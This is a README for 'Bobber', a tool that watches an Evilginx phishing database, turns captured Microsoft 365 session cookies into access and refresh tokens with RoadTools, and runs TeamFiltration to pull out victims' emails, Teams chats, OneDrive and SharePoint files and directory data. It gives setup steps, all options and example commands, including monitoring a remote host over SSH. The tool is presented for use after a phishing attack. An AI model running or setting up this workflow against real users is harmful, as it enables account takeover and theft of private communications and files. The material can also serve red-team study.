# Bobber - Bounces when a fish bites!
```
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
```
Bobber monitors a given Evilginx database file for changes, and if a valid Evilginx session complete with a captured Microsoft Office 365 cookie is found, Bobber will utilize the RoadTools RoadTX library to retrieve the access and refresh token for the user, then optionally trigger TeamFiltration to exfiltrate all the sweet, sweet loot. Bobber supports monitoring a local file path or a file path on a remote host through SSH.

Bobber accepts a number of input arguments to adjust the RoadTools interactive auth flow, selection between key and credentials-based SSH auth, as well as the added benefit of getting pushover notifications once a user submits their credentials and the loot is on the way.

```
usage: Bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [--all] [--aad] [--teams]
                 [--onedrive] [--owa] [--owa-limit OWA_LIMIT] [-c CLIENT] [-r RESOURCE] [-s SCOPE] [-ru URL] [-t TENANT] [-d DRIVER_PATH] [-k]
                 database_path

positional arguments:
  database_path         Path to the local OR remote Evilginx database file.

options:
  -h, --help            show this help message and exit

SSH Options:
  Evilginx database monitoring SSH options

  --host HOST           SSH hostname/IP when fetching from a remote host.
  --port PORT           SSH port when fetching from a remote host.
  --username USERNAME   SSH username when fetching from a remote host.
  --password PASSWORD   SSH password when fetching from a remote host.
  --key KEY             Path to the SSH private key file for authentication.

Pushover Options:
  Pushover notifications options

  --user-key USER_KEY   Pushover User Key
  --api-token API_TOKEN
                        Pushover API Token

TeamFiltration Options:
  Exfiltration options for TeamFiltration

  --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
  --aad                 Exfiltrate information from Graph API (domain users and groups)
  --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
  --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user's entire OneDrive directory)
  --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)
  --owa-limit OWA_LIMIT
                        Set the max amount of emails to exfiltrate, default is 2k.

RoadTools Options:
  RoadTools RoadTX interactive authentication options

  -c CLIENT, --client CLIENT
                        Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)
  -r RESOURCE, --resource RESOURCE
                        Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)
  -s SCOPE, --scope SCOPE
                        Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.
  -ru URL, --redirect-url URL
                        Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)
  -t TENANT, --tenant TENANT
                        Tenant ID or domain to auth to
  -d DRIVER_PATH, --driver-path DRIVER_PATH
                        Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)
  -k, --keep-open       Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials
```
# Setup

1. `git clone https://github.com/Flangvik/Bobber`
2. `pip install -r requirements.txt`
3. Download the latest version of [TeamFiltration](https://github.com/Flangvik/TeamFiltration/releases/latest) for your platform, and place the binary inside the Bobber folder
4. Download the latest version of [Geckodriver](https://github.com/mozilla/geckodriver/releases) for your platform, and place the binary inside the Bobber folder
5. `python3 Bobber.py --help` and get going!

# Example Usage

Monitor a local file for changes, exchange cookie for JWT tokens, from get pushover notifications when a new session is found, exfiltrate all data
```
python Bobber.py evilginx_data.db --user-key 98fc5roupp78g0ymvzcw2ygun2gz7u --api-token jg3sycg5lwkqoxa647eaqzdhnrtlwy --all
```

Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchanged cookie for JWT tokens, exfiltrate only AAD Graph API data
```
python Bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
```

Monitor a remote file for changes via SSH, authenticate using a username and password, exchange cookie for JWT tokens,  exfiltrate only emails 
```
python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --host 1337.66.69.420  --owa 
```